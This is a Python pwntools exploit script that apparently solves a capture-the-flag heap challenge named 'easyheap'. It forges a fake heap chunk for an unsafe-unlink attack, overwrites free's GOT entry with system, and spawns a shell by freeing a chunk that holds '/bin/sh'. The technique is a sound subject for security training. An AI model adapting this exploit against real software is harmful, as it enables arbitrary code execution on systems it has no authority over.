from pwn import *
context(arch='amd64', log_level='debug')

io = process('./easyheap')
elf = ELF('./easyheap')
# io = remote('node4.buuoj.cn', 28974)

def create(size, content):
	io.sendlineafter(b'Your choice :', b'1')
	io.sendlineafter(b'Size of Heap : ', str(size).encode())
	io.sendlineafter(b'Content of heap:', content)

def edit(index, size, content):
	io.sendlineafter(b'Your choice :', b'2')
	io.sendlineafter(b'Index :', str(index).encode())
	io.sendlineafter(b'Size of Heap : ', str(size).encode())
	io.sendlineafter(b'Content of heap :', content)

def delete(index):
	io.sendlineafter(b'Your choice :', b'3')
	io.sendlineafter(b'Index :', str(index).encode())
	
create(0x80, b'colin')	# chunk #0
create(0x80, b'colin')	# chunk #1
create(0x80, b'/bin/sh')	# chunk #2
fakechunk_struct = p64(0)
fakechunk_struct += p64(0x80)	# fake chunk size = 0x80
fakechunk_struct += p64(0x6020E0 - 0x18)	# fake chunk fd, fd->bk = fake chunk
fakechunk_struct += p64(0x6020E0 - 0x10)	# fake chunk bk, bk->fd = fake chunk
fakechunk_struct += cyclic(0x80 - 0x20)
fakechunk_struct += p64(0x80)	# overwrite chunk #1 prev size
fakechunk_struct += p64(0x90)	# overwrite prev_in_use bit = 0
edit(0, 0x90, fakechunk_struct)
delete(1)	# trigger unlink, after deletion chunk #0 should be 0x6020E0 - 0x18 = 0x6020C8
gdb.attach(io)
time.sleep(2)
edit(0, 0x20, cyclic(0x18) + p64(elf.got['free']))	# change chunk #0 to free().got
edit(0, 0x8, p64(elf.plt['system']))	# change free().got to system().plt
delete(2)	# system('/bin/sh')
io.interactive()